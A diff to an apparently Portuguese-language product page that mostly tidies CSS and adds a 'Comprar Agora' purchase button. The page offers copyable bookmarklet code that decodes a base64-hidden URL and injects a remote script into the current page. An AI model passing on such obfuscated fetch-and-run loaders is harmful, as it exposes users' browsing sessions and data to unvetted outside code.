@@ -113,14 +113,13 @@
       overflow-x: hidden;
     }
 
-    /* VIDEO DISPLAY CENTRALIZADO */
     .video-display {
       display: flex;
-      justify-content: center; /* centraliza horizontalmente */
-      align-items: center;     /* centraliza verticalmente */
+      justify-content: center;
+      align-items: center;
       outline: 1px dashed #00ff00;
       padding: 10px;
-      box-sizing: border-box;  /* inclui padding no tamanho */
+      box-sizing: border-box;
     }
 
     .video-display iframe {
@@ -155,12 +154,20 @@
       transition: all 0.3s ease;
       display: inline-block;
       user-select: none;
+      text-decoration: none;
     }
 
     .video-upload-btn:hover {
       background: linear-gradient(45deg, #006600, #009900);
       box-shadow: 0 0 20px rgba(0, 255, 0, 0.5);
       transform: translateY(-2px);
+    }
+
+    .button-group {
+      display: flex;
+      justify-content: center;
+      gap: 12px;
+      margin-top: 12px;
     }
 
     .footer {
@@ -177,6 +184,10 @@
       .video-upload-btn {
         font-size: 0.95rem;
         padding: 10px 20px;
+      }
+      .button-group {
+        flex-direction: column;
+        gap: 10px;
       }
     }
   </style>
@@ -220,8 +231,9 @@
         <pre><code id="codeArea">
 javascript:(function()%7Bvar%20s%3Ddocument.createElement('script')%3Bs.src%3Datob('aHR0cHM6Ly9jb3B5bGVhZC52ZXJjZWwuYXBwL3NjcmlwdC5qcw%3D%3D')%3Bdocument.body.appendChild(s)%7D)()
         </code></pre>
-        <div style="text-align:center; margin-top:12px;">
+        <div class="button-group">
           <button class="video-upload-btn" id="copyBtn" onclick="copyCode()">📋 Copiar</button>
+          <a href="comprar.html" class="video-upload-btn">🛒 Comprar Agora</a>
         </div>
       </div>
     </div>
